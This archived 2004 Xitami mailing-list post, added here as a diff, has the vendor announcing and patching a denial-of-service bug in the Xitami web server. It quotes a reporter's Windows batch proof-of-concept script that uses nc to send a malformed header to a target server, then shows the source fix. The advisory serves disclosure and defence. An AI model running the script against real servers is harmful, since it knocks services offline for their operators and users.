@@ -1,0 +1,133 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Xitami DOS reported, fixed
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="006027.html">
+   <LINK REL="Next"  HREF="006031.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Xitami DOS reported, fixed
+   </H1>
+    <B>Pieter Hintjens
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Xitami DOS reported, fixed">xitami@lists.xitami.org
+       </A><BR>
+    <I>Thu, 22 Jul 2004 11:50:05 +0200</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="006027.html">[Xitami] webmail option
+</A></li>
+        <LI> Next message: <A HREF="006031.html">[Xitami] Xitami DOS reported, fixed
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#6030">[ date ]</a>
+              <a href="thread.html#6030">[ thread ]</a>
+              <a href="subject.html#6030">[ subject ]</a>
+              <a href="author.html#6030">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Hi,
+
+A serious denial of service has been found in Xitami.  This is the report:
+
+=2D-------------------------------------------------------------
+Application: =A0 =A0Xitami Web Server
+Vendors: =A0 =A0 =A0 =<A HREF="A0http://www.xitami.com/xiopen_2_5.zip">A0http://www.xitami.com/xiopen_2_5.zip</A>
+Version: =A0 =A0 =A0 =A0v2.5c1
+Platforms: =A0 =A0 =A0Windows
+Bug: =A0 =A0 =A0 =A0 =A0 =A0D.O.S
+Date: =A0 =A0 =A0 =A0 =A0 2004-07-15
+Author: =A0 =A0 =A0 =A0 CoolICE
+e-mail: =A0 =A0 =A0 =A0 CoolICE#China.com
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Content:
+=2D---------------
+TestCode:
+@echo off
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<i>
+</I>:<i>Application: =A0 Xitami Web Server
+</I>:<i>Vendors: =A0 =A0 =A0 <A HREF="http://www.xitami.com/xiopen_2_5.zip">http://www.xitami.com/xiopen_2_5.zip</A>
+</I>:<i>Version: =A0 =A0 =A0 v2.5c1
+</I>:<i>Platforms: =A0 =A0 Windows
+</I>:<i>Bug: =A0 =A0 =A0 =A0 =A0 D.O.S
+</I>:<i>Date: =A0 =A0 =A0 =A0 =A02004-07-15
+</I>:<i>Author: =A0 =A0 =A0 =A0CoolICE
+</I>:<i>e-mail: =A0 =A0 =A0 =A0CoolICE#China.com
+</I>::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::<i>
+</I>if '%1'=3D=3D'' echo Usage:%0 target [port]&amp;&amp;goto :eof
+set PORT=3D80
+if not '%2'=3D=3D'' set PORT=3D%2
+for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe echo Nee=
+d=20
+nc.
+exe&amp;&amp;goto :eof
+echo GET / HTTP/1.0&gt;http.tmp
+echo HOST: %1&gt;&gt;http.tmp
+echo DOS&gt;&gt;http.tmp
+echo.&gt;&gt;http.tmp
+nc -w 10 %1 %PORT% &lt; http.tmp
+del http.tmp
+=2D-------------------------------------------------------------
+
+Although the report was posted on the 15th, we received it this morning, so=
+=20
+there is some chance that people have exploited this against Xitami servers=
+=20
+in the meantime.
+
+The denial of service is this: a malformed header (without the ':') causes =
+the=20
+server to enter an endless loop.
+
+This DOS affects all versions of Xitami.  For those building from source, t=
+he=20
+affected file is smthttpl.c, and the patch is in the function=20
+http_parse_header:
+
+char *
+http_parse_header (HTTP_CONTEXT *p_http, char *header)
+{
+=2E..
+    while (header &amp;&amp; *header &amp;&amp; *header !=3D '\r') {
+	...
+        }
+++        else
+++           break;
+    }
+    return (header);
+}
+
+We are in the process of releasing new binaries, which will be on Xitami.co=
+m=20
+in a very short while.
+
+=2D-=20
+Pieter Hintjens
+iMatix Corporation
+
+
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="006027.html">[Xitami] webmail option
+</A></li>
+	<LI> Next message: <A HREF="006031.html">[Xitami] Xitami DOS reported, fixed
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#6030">[ date ]</a>
+              <a href="thread.html#6030">[ thread ]</a>
+              <a href="subject.html#6030">[ subject ]</a>
+              <a href="author.html#6030">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
